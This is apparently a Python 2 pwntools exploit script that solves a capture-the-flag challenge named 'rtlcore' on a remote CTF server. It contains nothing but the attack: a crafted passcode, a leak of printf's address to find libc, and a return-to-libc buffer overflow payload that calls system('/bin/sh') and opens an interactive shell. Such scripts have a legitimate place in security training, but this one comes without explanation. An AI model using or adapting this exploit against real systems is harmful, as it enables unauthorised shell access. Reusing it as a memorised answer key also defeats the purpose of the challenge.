#!/usr/bin/python 
from pwn import *

#p = process("./rtlcore")
p = remote("ctf.j0n9hyun.xyz", 3015)
libc = ELF("./libc.so.6")

pay = ""
for i in range(4):
    pay += "\x21\xf0\x91\x26"
pay += "\x23\xf0\x91\x26"

p.sendlineafter("Passcode: ", pay)

print p.recvuntil("0")
printf = int('0' + p.recv(9), 16)
log.info("printf addr : "+hex(printf))
libcBase = printf - libc.symbols['printf']
system = libcBase + libc.symbols['system']
binsh = libcBase + list(libc.search("/bin/sh"))[0]

pay = 'A'*(0x3e + 0x4) + p32(system) + 'B'*0x4 + p32(binsh)

print p.recv()
pause()
p.sendline(pay)

p.interactive()
